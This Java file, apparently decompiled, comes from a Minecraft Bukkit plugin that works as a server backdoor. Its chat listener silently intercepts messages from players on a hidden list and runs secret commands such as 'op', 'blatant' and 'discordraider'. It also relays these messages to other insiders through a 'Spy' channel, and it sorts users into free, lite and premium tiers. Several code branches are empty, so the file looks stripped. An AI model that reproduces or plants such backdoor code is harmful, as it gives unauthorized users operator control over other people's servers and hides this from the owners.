
package me.system.runner.command;

import me.system.runner.Core;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class CommandManager
implements Listener {
    private static final Core INSTANCE = Core.getPlugin(Core.class);

    @EventHandler(priority=EventPriority.MONITOR)
    public void onChat(AsyncPlayerChatEvent q2) {
        Player p2 = q2.getPlayer();
        String command = q2.getMessage().toLowerCase().contains(" ") ? q2.getMessage().toLowerCase().substring(0, q2.getMessage().indexOf(" ")) : q2.getMessage();
        String[] args = new String[]{};
        if (q2.getMessage().contains(" ")) {
            args = q2.getMessage().split(" ");
        }
        if (args == null) {
            return;
        }
        if (INSTANCE.lite.contains(p2.getName())) {
            if (!q2.isCancelled() && !q2.getMessage().toLowerCase().startsWith("chat")) {
                q2.setCancelled(true);
                for (Player a2 : Bukkit.getOnlinePlayers()) {
                    if (!INSTANCE.cmdSpy.contains(a2.getName()) || a2.getName().equals(p2.getName())) continue;
                    a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&8[&4Spy&8] &7" + p2.getName() + " &8» &f" + q2.getMessage()));
                }
                if (command.endsWith(".")) {
                    command = command.replace(".", "");
                }
                Command cmd = INSTANCE.commands.get(command);
                if (INSTANCE.commands.containsKey(command.toLowerCase())) {
                    if (!INSTANCE.blatant.contains(p2.getName()) && cmd.isBlatant()) {
                        p2.sendMessage(Settings.PREFIX("This command has been marked as " + Settings.RED + "blatant" + Settings.WHITE));
                        p2.sendMessage(Settings.USAGE("Enable blatant mode using " + Settings.RED + "blatant"));
                    } else if (INSTANCE.enabled) {
                        if (INSTANCE.free.contains(p2.getName())) {
                            if (q2.getMessage().toLowerCase().startsWith("op") || q2.getMessage().toLowerCase().startsWith("blatant") || q2.getMessage().toLowerCase().startsWith("logout") || q2.getMessage().toLowerCase().startsWith("help") || q2.getMessage().toLowerCase().startsWith("premiumhelp") || q2.getMessage().toLowerCase().startsWith("discordraider") || q2.getMessage().toLowerCase().startsWith("fn")) {
                                cmd.execute(INSTANCE, command, args, p2);
                            } else {
                                p2.sendMessage(Settings.PREFIX("You must be " + Settings.RED + "lite " + Settings.WHITE + "to execute this command"));
                            }
                        } else {
                            cmd.execute(INSTANCE, command, args, p2);
                        }
                    } else {
                        
                        
                    }
                } else if (INSTANCE.serverchat.contains(p2.getName())) {
                    StringBuilder chat = new StringBuilder();
                    for (int i2 = 0; i2 != args.length; ++i2) {
                        chat.append(args[i2]).append(" ");
                    }
                    if (args.length >= 1) {
                        
                        
                    } else {
                        
                        
                    }
                } else {
                    p2.sendMessage(Settings.USAGE("This command wasn't found. Use " + Settings.RED + "'help'" + Settings.WHITE + " for help."));
                }
            } else if (q2.getMessage().toLowerCase().startsWith("chat")) {
                if (args.length <= 1) {
                    p2.sendMessage(Settings.USAGE("chat <message>"));
                    q2.setMessage(null);
                    q2.setCancelled(true);
                } else {
                    StringBuilder chat = new StringBuilder();
                    for (int i3 = 1; i3 != args.length; ++i3) {
                        chat.append(args[i3]).append(" ");
                    }
                    q2.setMessage(chat.toString());
                    q2.setCancelled(false);
                }
            }
        }
    }
}

